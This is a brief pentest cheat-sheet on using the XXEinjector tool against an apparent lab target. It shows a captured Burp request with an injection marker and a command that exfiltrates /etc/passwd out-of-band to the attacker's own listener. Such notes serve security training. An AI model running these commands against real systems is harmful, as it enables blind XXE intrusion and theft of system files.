# XXE Injector

OS: Web
Description: XXE Injector GitHub
Security Domains: Reconnaissance (https://www.notion.so/Reconnaissance-1434c8e5237680fe960be92e51e13491?pvs=21)
Target_Technology: xxe (https://www.notion.so/xxe-1434c8e523768048ad75f438f64aa482?pvs=21)
URL: git clone https://github.com/enjoiz/XXEinjector.git

### XXE Injector

```jsx
git clone https://github.com/enjoiz/XXEinjector.git
```

- Steps:
    - 1.) Copy Req from Burp
    
    ```jsx
    POST /blind/submitDetails.php HTTP/1.1
    Host: 10.129.201.94
    Content-Length: 169
    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko)
    Content-Type: text/plain;charset=UTF-8
    Accept: */*
    Origin: http://10.129.201.94
    Referer: http://10.129.201.94/blind/
    Accept-Encoding: gzip, deflate
    Accept-Language: en-US,en;q=0.9
    Connection: close
    
    <?xml version="1.0" encoding="UTF-8"?>
    XXEINJECT
    ```
    
- 2.) Run the tool so that info is exported to our locale python3 web server

```jsx
ruby XXEinjector.rb --host=[tun0 IP] --httpport=8000 --file=/tmp/xxe.req --path=/etc/passwd --oob=http --phpfilter
```

- 3) Read the data

```jsx
cat Logs/10.129.201.94/etc/passwd.log 
```